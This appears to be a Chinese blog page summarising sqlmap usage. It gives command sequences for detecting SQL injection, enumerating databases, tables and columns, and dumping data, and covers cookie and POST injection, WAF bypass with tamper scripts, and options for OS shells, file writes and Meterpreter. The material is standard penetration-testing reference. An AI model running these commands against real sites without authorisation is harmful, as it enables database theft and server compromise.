<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Sqlmap常用命令总结 - 编程大咖</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:url" content="https://bcdaka.github.io/posts/29c922acfc14a5e67fa0e272459465fb/">
  <meta property="og:site_name" content="编程大咖">
  <meta property="og:title" content="Sqlmap常用命令总结">
  <meta property="og:description" content="sqlmap常用命令总结： 注意：命令为kali linux中运行的 （windows中用python sqlmap.py执行） 1#、注入六连： 1. sqlmap -u &#34;http://www.xx.com?id=x&#34; 【查询是否存在注入点
--dbs 【检测站点包含哪些数据库 3. --current-db 【获取当前的数据库名
--tables -D &#34;db_name&#34; 【获取指定数据库中的表名 -D后接指定的数据库名称 5. --columns -T &#34;table_name&#34; -D &#34;db_name&#34; 【获取数据库表中的字段
6. --dump -C &#34;columns_name&#34; -T &#34;table_name&#34; -D &#34;db_name&#34; 【获取字段的数据内容
2#、COOKIE注入： sqlmap -u &#34;http://www.xx.com?id=x&#34; --cookie &#34;cookie&#34; --level 2 【cookie注入 后接cookie值
--dbs 【检测站点包含哪些数据库 3. --current-db 【获取当前的数据库名
--tables -D &#34;db_name&#34; 【获取指定数据库中的表名 -D后接指定的数据库名称 5. --columns -T &#34;table_name&#34; -D &#34;db_name&#34; 【获取数据库表中的字段
6. --dump -C &#34;columns_name&#34; -T &#34;">
  <meta property="og:locale" content="zh_CN">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-02-26T10:14:38+08:00">
    <meta property="article:modified_time" content="2024-02-26T10:14:38+08:00">

	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
  


</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大咖" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大咖</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">Sqlmap常用命令总结</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <h2>sqlmap常用命令总结：</h2> 
<h4>注意：命令为kali linux中运行的 （windows中用python sqlmap.py执行）</h4> 
<h5>1#、注入六连：</h5> 
<p>1.   sqlmap -u  "<a href="http://www.xx.com?id=x" rel="nofollow" title="http://www.xx.com?id=x">http://www.xx.com?id=x</a>"    【查询是否存在注入点</p> 
<ol><li>--dbs         【检测站点包含哪些数据库</li></ol> 
<p>3.     --current-db    【获取当前的数据库名</p> 
<ol><li>--tables -D "db_name"  【获取指定数据库中的表名 -D后接指定的数据库名称</li></ol> 
<p>5.     --columns  -T "table_name" -D "db_name"  【获取数据库表中的字段</p> 
<p>6.     --dump -C "columns_name" -T "table_name" -D "db_name"  【获取字段的数据内容</p> 
<h5>2#、COOKIE注入： </h5> 
<p>sqlmap -u "<a href="http://www.xx.com?id=x" rel="nofollow" title="http://www.xx.com?id=x">http://www.xx.com?id=x</a>" --cookie "cookie" --level 2  【cookie注入 后接cookie值</p> 
<ol><li>--dbs         【检测站点包含哪些数据库</li></ol> 
<p>3.     --current-db    【获取当前的数据库名</p> 
<ol><li>--tables -D "db_name"  【获取指定数据库中的表名 -D后接指定的数据库名称</li></ol> 
<p>5.     --columns  -T "table_name" -D "db_name"  【获取数据库表中的字段</p> 
<p>6.     --dump -C "columns_name" -T "table_name" -D "db_name"  【获取字段的数据内容</p> 
<p></p> 
<h5>3#、POST注入：</h5> 
<p>（1）目标地址http:// www.xxx.com /login.asp</p> 
<p>（2）打开brup代理。</p> 
<p>（3）点击表单提交</p> 
<p>（4）burp获取拦截信息（post）</p> 
<p>（5）右键保存文件（.txt）到指定目录下</p> 
<p>（6）运行sqlmap并执行如下命令：</p> 
<p>用例：sqlmap -r okay.txt  -p  username</p> 
<p>// -r表示加载文件(及步骤（5）保存的路径)，-p指定参数（即拦截的post请求中表单提交的用户名或密码等name参数）</p> 
<p>（7）自动获取表单：--forms自动获取表单</p> 
<p>例如：sqlmap -u www.xx.com/login.asp --forms</p> 
<p>（8）指定参数搜索：--data</p> 
<p>例如:sqlmap -u www.xx.com/login.asp --data "username=1"</p> 
<h5>4#、常用指令：</h5> 
<ol><li>--purge      【重新扫描（--purge 删除原先对该目标扫描的记录）</li></ol> 
<p>2.    --tables      【获取表名</p> 
<ol><li>--dbs         【检测站点包含哪些数据库</li></ol> 
<p>4.     --current-db    【获取当前的数据库名</p> 
<p>5.     --current-user  【检测当前用户</p> 
<p>6.    --is-dba   【判断站点的当前用户是否为数据库管理员</p> 
<p>7.    --batch      【默认确认，不询问你是否输入</p> 
<p>8.    --search  【后面跟参数 -D -T -C 搜索列（C），表（T）和或数据库名称（D）</p> 
<p>9.    --threads 10  【线程，sqlmap线程最高设置为10</p> 
<p>10.  --level 3        【sqlmap默认测试所有的GET和POST参数，当--level的值大于等于2的时候也会测试HTTP Cookie头</p> 
<p>                                的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。最高为5</p> 
<p>11.  --risk 3           【执行测试的风险（0-3，默认为1）risk越高，越慢但是越安全</p> 
<p>12.     -v   【详细的等级(0-6)</p> 
<p>          0：只显示Python的回溯，错误和关键消息。</p> 
<p>          1：显示信息和警告消息。</p> 
<p>          2：显示调试消息。</p> 
<p>          3：有效载荷注入。</p> 
<p>          4：显示HTTP请求。</p> 
<p>          5：显示HTTP响应头。</p> 
<p>          6：显示HTTP响应页面的内容</p> 
<p>13.    --privileges  【查看权限</p> 
<p>14.   --tamper xx.py,cc.py   【防火墙绕过，后接tamper库中的py文件</p> 
<p>15.  --method "POST" --data "page=1&amp;id=2"   【POST方式提交数据</p> 
<p>16.  --threads number　　【采用多线程 后接线程数</p> 
<p>17.  --referer  ""  【使用referer欺骗</p> 
<p>18.  --user-agent ""     【自定义user-agent</p> 
<p>19.  --proxy “目标地址″   【使用代理注入</p> 
<h3>命令字符解释==</h3> 
<p>-h                                           显示基本帮助信息</p> 
<p>-hh                                         显示高级帮助信息</p> 
<p>--version                                显示版本号</p> 
<p>-v                                           详细等级（0-6 默认 1）</p> 
<p>0：只显示python错误以及重要信息</p> 
<p>1：显示信息以及警告</p> 
<p>2：显示debug消息</p> 
<p>3：显示注入payload</p> 
<p>4：显示http请求</p> 
<p>5：显示http响应头·</p> 
<p>6：显示http响应内容</p> 
<p>Target：</p> 
<p>-u                                          指定目标url</p> 
<p>-d                                          直接连接数据库</p> 
<p>-l                                           从burp代理日志的解析目标</p> 
<p>-r                                           从文件中加载http请求</p> 
<p>-g                                          从google dork的结果作为目标url</p> 
<p>-c                                          从INI配置文件中加载选项</p> 
<p>Request</p> 
<p>-A                                         指定user-agent头</p> 
<p>-H                                         额外的header</p> 
<p>-method=                              指定HTTP方法（GET/POST）</p> 
<p>--data=                                 通过POST提交数据</p> 
<p>--param-del=                        指定参数分隔符</p> 
<p>--cookie=                              指定cookie的值</p> 
<p>--cookie-del=                        指定cookie分隔符</p> 
<p>--drop-set-cookie                  扔掉response中的set-cookie头</p> 
<p>--random-agent                    使用随机的user-agent头</p> 
<p>--host=                                  设置host头</p> 
<p>--referer=                              指定referer头</p> 
<p>--headers=                            额外的headers</p> 
<p>--auth-type=                          http认证类型（Basic，NTLM，Digest）</p> 
<p>--auith-cred=                         http认证凭证（账号：密码）</p> 
<p>--ignore-proxy                       忽略系统代理（常用于扫描本地文件）</p> 
<p>--proxy=                                使用代理</p> 
<p>--proxy-cred=                        代理认证证书（账号：密码）</p> 
<p>--delay=                                 设置延迟时间（两个请求之间）</p> 
<p>--timeout=                              超时时来连接前等待（默认 30）</p> 
<p>--retries=                                连接超时时重试次数（默认 3）</p> 
<p>--randomize=                         随机更改指定的参数的值</p> 
<p>--safe-url=                             在测试期间经常访问的URL</p> 
<p>--safe-post=                           POST数据发送到安全的URL</p> 
<p>--safe-freq=                           两次请求之间穿插一个安全的URL</p> 
<p>--skip-urlencode                    跳过payload数据的URL编码</p> 
<p>--chunked                             使用HTTP分块传输加密POST请求</p> 
<p>--hpp                                    使用HTTP参数pollution方法（常用于绕过IPS/IDS检测）</p> 
<p>--force-ssl                             强制使用SSL/HTTPS</p> 
<p>--eval=value                         请求之前提供Python代码（eg："import hashlib;id2=hashlib.md5(id).hexdigest()"）</p> 
<p>Optimization</p> 
<p>-o                                         打开所有优化开关</p> 
<p>--predict-output                   预测输出（与--threads不兼容）</p> 
<p>--keep-alive                         建立长久的HTTP(S)连接 (与--proxy不兼容)</p> 
<p>--null-connection                 空连接</p> 
<p>--threads=value                  设置线程(默认 1)</p> 
<p>Injection</p> 
<p>-p                                       指定测试参数</p> 
<p>--skip=                               跳过指定参数的测试</p> 
<p>--skip-static                        跳过测试静态的参数</p> 
<p>--dbms=                             指定具体DBMS</p> 
<p>--os=                                  指定DBMS操作系统</p> 
<p>--invalid-bignum                使用大数字使值无效</p> 
<p>--invalid-logical                  使用逻辑符使值无效</p> 
<p>--invalid-string                   使用字符串使值无效</p> 
<p>--no-cast                             关闭payload铸造机制</p> 
<p>--no-escape                       关闭字符转义机制（默认自动开启）</p> 
<p>--prefix=                             加入payload前缀</p> 
<p>--suffix=                              加入payload后缀</p> 
<p>--tamper=                          指定使用的脚本</p> 
<p>Detectiong</p> 
<p>--level=                              指定测试的等级（1-5 默认为1）</p> 
<p>--risk=                               指定测试的风险（0-3 默认为1）</p> 
<p>--string=                            登录成功时，页面所含有的“关键字” 用于证明已经登录成功</p> 
<p>--not-string=                      登录成功时，页面所含有的“关键字” 用于证明已经登录失败</p> 
<p>--code=                             查询为真时，匹配的HTTP代码</p> 
<p>--smart                              当有大量检测目标时，只选择基于错误的检测结果</p> 
<p>--text-only                         仅基于文本内容比较网页</p> 
<p>--titles                               仅基于标题比较网页</p> 
<p>Techniques</p> 
<p>--technique=                      指定sql注入技术（默认BEUSTQ）</p> 
<p>--time-sec=                        基于时间注入检测相应的延迟时间（默认为5秒）</p> 
<p>--union-clos=                     进行查询时，指定列的范围</p> 
<p>--union-char=                    指定暴力破解列数的字符</p> 
<p>Fingerprint</p> 
<p>-f                                      查询目标DBMS版本指纹信息</p> 
<p>Emuneration</p> 
<p>-a                                    查询所有</p> 
<p>-b                                    查询目标DBMS banner信息</p> 
<p>--current-user                 查询目标DBMS当前用户</p> 
<p>--current-db                    查询目标DBMS当前数据库</p> 
<p>--is-dba                          查询目标DBMS当前用户是否为DBA</p> 
<p>--users                            枚举目标DBMS所有的用户</p> 
<p>--paswords                     枚举目标DBMS用户密码哈希值</p> 
<p>--privileges                     枚举目标DBMS用户的权限</p> 
<p>--roles                            枚举DBMS用户的角色</p> 
<p>--dbs                              枚举DBMS所有的数据库</p> 
<p>--tables                          枚举DBMS数据库中所有的表</p> 
<p>--columns                      枚举DBMS数据库表中所有的列</p> 
<p>--count                         检索表的条目的数量</p> 
<p>--dump                         存储DBMS数据库的表中的条目</p> 
<p>--dump-all                     存储DBMS所有数据库表中的条目</p> 
<p>--D db                          指定进行枚举的数据库名称</p> 
<p>--T   table                     指定进行枚举的数据库表名称</p> 
<p>--C   column                 指定进行枚举的数据库列名称</p> 
<p>--exclude-sysdbs          枚举表时排除系统数据库</p> 
<p>--sql-query                    指定查询的sql语句</p> 
<p>--sql-shell                     提示输入一个交互式sql shell</p> 
<p>Brute force</p> 
<p>--common-tables                       暴力破解表</p> 
<p>--common-colomns                    暴力破解列</p> 
<p>File system access</p> 
<p>--file-read                            从目标数据库管理文件系统读取文件</p> 
<p>--file-write                           上传文件到目标数据库管理文件系统</p> 
<p>--file-dest                             指定写入文件的绝对路径</p> 
<p>--os-cmd=                           执行操作系统命令</p> 
<p>--os-shell                            交互式的系统shell</p> 
<p>--os-pwn                             获取一个OOB shell，Meterpreter或者VNC</p> 
<p>--os-smbrelay                    一键 获取一个OOB shell，Meterpreter或者VNC</p> 
<p>--os-bof                              储存过程缓冲区溢出利用</p> 
<p>--os-esc                              数据库进程用户权限提升</p> 
<p>--msf-path=                        Metasploit  Framework本地安装路径</p> 
<p>General</p> 
<p>-s                                     sqlite会话文件保存位置</p> 
<p>-t                                      记录所有HTTP流量到指定文件中</p> 
<p>--batch                             测试过程中， 执行所有默认配置</p> 
<p>--charset=v                      强制用于数据检索的字符编码</p> 
<p>--crawl=                           从目标URL开始爬取网站</p> 
<p>--crawl-exclude=              禁止爬取某个页面（eg：logout）</p> 
<p>--csv-del=                        指定CSV输出中使用的的字符</p> 
<p>--dump-format=               储存数据的方式（CSV(default)，HTML，SQLITE）</p> 
<p>--flush-session                 刷新当前目标的会话文件</p> 
<p>--fresh-queries                 忽略会话文件中储存的查询结果，重新查询</p> 
<p>--hex                                使用DBMS hex函数进行数据检索</p> 
<p>--outpout-dir=                  自定义输出目录</p> 
<p>--save=                            保存选项到INI配置文件中</p> 
<p>--scope=                          使用正则表达式从提供的日志中guo'l</p> 
<p>--alert                               再找到SQL注入时运行主机操作系统命令</p> 
<p>--purge-output                  安全的从输出目录中删除所有内容</p> 
<p>--sqlmap-shell                  提示输入交互式sqlmap  shell</p> 
<p>--update                           更新sqlmap</p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/4f0a1564a2ea3263c5fe7a9c750c35f9/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">Java实战：Spring Boot实现WebSocket实时通信</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/7700c8e738861cb0a04cc7487c291554/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">【企业微信自建应用-前端篇】企业微信自建应用开发流程详细介绍</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大咖.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>